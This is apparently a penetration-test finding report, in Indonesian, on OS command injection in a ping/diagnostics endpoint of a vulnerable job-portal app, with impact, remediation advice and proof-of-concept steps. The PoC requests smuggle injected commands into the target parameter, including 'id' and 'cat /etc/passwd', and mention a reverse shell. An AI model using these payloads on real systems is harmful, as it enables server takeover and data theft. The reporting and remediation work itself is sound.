# Finding 02: Command Injection

| Item | Detail |
|------|--------|
| **Kerentanan** | Command Injection (OS Command Injection) |
| **Severity** | Critical |
| **Skor CVSS** | 9.8 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`) |
| **URL PoC** | `http://jobportal.vulnapp.id/api/tools/ping?target=127.0.0.1%7Cid` |
| **Endpoint** | `GET /api/tools/ping?target=...` / `POST /api/system/diagnostics` |

---

## Deskripsi

Kerentanan ini terjadi karena aplikasi meneruskan input dari pengguna langsung ke dalam perintah sistem operasi (*system shell*) tanpa sanitasi atau escaping yang memadai. Kondisi ini memungkinkan penyerang menyisipkan karakter pemisah perintah (seperti `;`, `&&`, `%0A` , atau `|`) untuk mengeksekusi perintah arbitrer di sistem operasi server.

---

## Dampak

- Penyerang dapat melakukan eksekusi perintah jarak jauh (Remote Code Execution) untuk menjalankan perintah sistem operasi secara bebas dengan tingkat hak akses aplikasi web.
- Penyerang dapat mengambil kontrol total atas server aplikasi (Full Server Compromise).
- Penyerang dapat melakukan pencurian dan kerusakan data (Data Breach & Destruction) seperti membaca file rahasia dan menghapus direktori server.
- Penyerang dapat melakukan eksplorasi jaringan internal (Pivoting) untuk memindai infrastruktur internal lainnya.

---

## Rekomendasi Perbaikan

- Terapkan sanitasi dan validasi input ketat (allowlist alfanumerik).
- Jalankan aplikasi web menggunakan akun sistem dengan hak akses minimal (Least Privilege).
- Hindari memanggil perintah sistem operasi secara langsung dan utamakan penggunaan fungsi API bawaan (*built-in API/library*).
- Jika eksekusi fungsi eksternal tetap diperlukan, gunakan parameterized API atau safe functions yang memisahkan perintah dan argumen tanpa memanggil shell (seperti `execFile` di Node.js atau list argumen pada `subprocess.run` tanpa `shell=True`).

---

## Langkah Proof of Concept (PoC)

### Langkah 1 — Mengidentifikasi endpoint yang memproses perintah shell

Mengirimkan request pengujian normal ke fitur diagnostik/ping.

**Request:**

```http
GET /api/tools/ping?target=127.0.0.1 HTTP/1.1
Host: jobportal.vulnapp.id
```

> **Capture 1:** Request normal ke endpoint diagnostik ping

---

### Langkah 2 — Menyisipkan karakter pemisah perintah (`|` atau `;`) dan perintah OS (`id`)

Menambahkan karakter pipe `|` atau semicolon `;` pada parameter input untuk mengeksekusi perintah tambahan di sistem operasi server.

**Request:**

```http
GET /api/tools/ping?target=127.0.0.1%7Cid HTTP/1.1
Host: jobportal.vulnapp.id
```

**Response (Output Perintah Tereksekusi):**

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Capture 2:** Response eksekusi perintah OS tambahan (`id`)

---

### Langkah 3 — Verifikasi dampak lanjutan dengan eksekusi perintah pembacaan file / reverse shell

Menjalankan perintah tambahan seperti `cat /etc/passwd` atau mengeksekusi reverse shell listener untuk membuktikan dampak Remote Code Execution (RCE) penuh.

**Request:**

```http
GET /api/tools/ping?target=127.0.0.1%7Ccat+/etc/passwd HTTP/1.1
Host: jobportal.vulnapp.id
```

> **Capture 3:** Pembacaan isi berkas `/etc/passwd` melalui Command Injection
